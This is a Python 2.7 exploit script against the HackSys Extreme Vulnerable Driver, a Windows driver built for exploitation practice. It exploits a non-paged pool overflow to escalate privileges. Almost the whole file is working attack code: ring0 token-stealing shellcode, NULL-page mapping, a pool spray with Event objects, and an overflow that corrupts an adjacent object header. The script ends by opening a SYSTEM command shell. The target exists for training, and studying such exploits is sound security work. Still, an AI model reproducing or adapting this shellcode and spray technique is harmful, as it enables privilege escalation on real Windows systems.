#python 2.7


import ctypes, sys, struct
from ctypes import *
from subprocess import *

def main():
	kernel32 = windll.kernel32
	ntdll = windll.ntdll

	hevDevice = kernel32.CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver", 0xC0000000, 0, None, 0x3, 0, None)

	if not hevDevice or hevDevice == -1:
		print "*** Couldn't get Device Driver handle."
		sys.exit(0)

	#Defining the ring0 shellcode and loading it in VirtualAlloc.
	shellcode = bytearray(
		"\x90\x90\x90\x90"              # NOP Sled
		"\x60"                          # pushad
		"\x64\xA1\x24\x01\x00\x00"      # mov eax, fs:[KTHREAD_OFFSET]
		"\x8B\x40\x50"                  # mov eax, [eax + EPROCESS_OFFSET]
		"\x89\xC1"                      # mov ecx, eax (Current _EPROCESS structure)
		"\x8B\x98\xF8\x00\x00\x00"      # mov ebx, [eax + TOKEN_OFFSET]
		"\xBA\x04\x00\x00\x00"          # mov edx, 4 (SYSTEM PID)
		"\x8B\x80\xB8\x00\x00\x00"      # mov eax, [eax + FLINK_OFFSET]
		"\x2D\xB8\x00\x00\x00"          # sub eax, FLINK_OFFSET
		"\x39\x90\xB4\x00\x00\x00"      # cmp [eax + PID_OFFSET], edx
		"\x75\xED"                      # jnz
		"\x8B\x90\xF8\x00\x00\x00"      # mov edx, [eax + TOKEN_OFFSET]
		"\x89\x91\xF8\x00\x00\x00"      # mov [ecx + TOKEN_OFFSET], edx
		"\x61"                          # popad
		"\xC2\x10\x00"                  # ret 16
	)

	ptr = kernel32.VirtualAlloc(c_int(0), c_int(len(shellcode)), c_int(0x3000),c_int(0x40))
	buff = (c_char * len(shellcode)).from_buffer(shellcode)
	kernel32.RtlMoveMemory(c_int(ptr), buff, c_int(len(shellcode)))

	print "[+] Pointer for ring0 shellcode: {0}".format(hex(ptr))

	#Allocating the NULL page, Virtual Address Space: 0x0000 - 0x1000.
	#The base address is given as 0x1, which will be rounded down to the next host.
	#We'd be allocating the memory of Size 0x100 (256).

	print "\n[+] Allocating/Mapping NULL page..."

	null_status = ntdll.NtAllocateVirtualMemory(0xFFFFFFFF, byref(c_void_p(0x1)), 0, byref(c_ulong(0x100)), 0x3000, 0x40)
	if null_status != 0x0:
		print "\t[+] Failed to allocate NULL page..."
		sys.exit(-1)
	else:
		print "\t[+] NULL Page Allocated"

	#Writing the ring0 pointer into the location in the mapped NULL page, so as to call the CloseProcedure @ 0x60.

	print "\n[+] Writing ring0 pointer {0} in location 0x60...".format(hex(ptr))
	if not kernel32.WriteProcessMemory(0xFFFFFFFF, 0x60, byref(c_void_p(ptr)), 0x4, byref(c_ulong())):
		print "\t[+] Failed to write at 0x60 location"
		sys.exit(-1)

	#Defining the Vulnerable User Buffer.
	#Length 0x1f8 (504), and "corrupting" the adjacent header to point to our NULL page.

	buf = "A" * 504
	buf += struct.pack("L", 0x04080040)
	buf += struct.pack("L", 0xEE657645)
	buf += struct.pack("L", 0x00000000)
	buf += struct.pack("L", 0x00000040)
	buf += struct.pack("L", 0x00000000)
	buf += struct.pack("L", 0x00000000)
	buf += struct.pack("L", 0x00000001)
	buf += struct.pack("L", 0x00000001)
	buf += struct.pack("L", 0x00000000)
	buf += struct.pack("L", 0x00080000)

	buf_ad = id(buf) + 20

	#Spraying the Non-Paged Pool with Event Objects. Creating two large enough (10000 and 5000) chunks.

	spray_event1 = spray_event2 = []

	print "\n[+] Spraying Non-Paged Pool with Event Objects..."

	for i in xrange(10000):
		spray_event1.append(kernel32.CreateEventA(None, False, False, None))
	print "\t[+] Sprayed 10000 objects."

	for i in xrange(5000):
		spray_event2.append(kernel32.CreateEventA(None, False, False, None))
	print "\t[+] Sprayed 5000 objects."

	#Creating holes in the sprayed region for our Vulnerable User Buffer to fit in.

	print "\n[+] Creating holes in the sprayed region..."

	for i in xrange(0, len(spray_event2), 16):
		for j in xrange(0, 8, 1):
			kernel32.CloseHandle(spray_event2[i+j])

	kernel32.DeviceIoControl(hevDevice, 0x22200f, buf_ad, len(buf), None, 0, byref(c_ulong()), None)

	#Closing the Handles by freeing the Event Objects, ultimately executing our shellcode.

	print "\n[+] Calling the CloseProcedure..."

	for i in xrange(0, len(spray_event1)):
		kernel32.CloseHandle(spray_event1[i])

	for i in xrange(8, len(spray_event2), 16):
		for j in xrange(0, 8, 1):
			kernel32.CloseHandle(spray_event2[i + j])

	print "\n[+] nt authority\system shell incoming"
	Popen("start cmd", shell=True)

if __name__ == "__main__":
	main()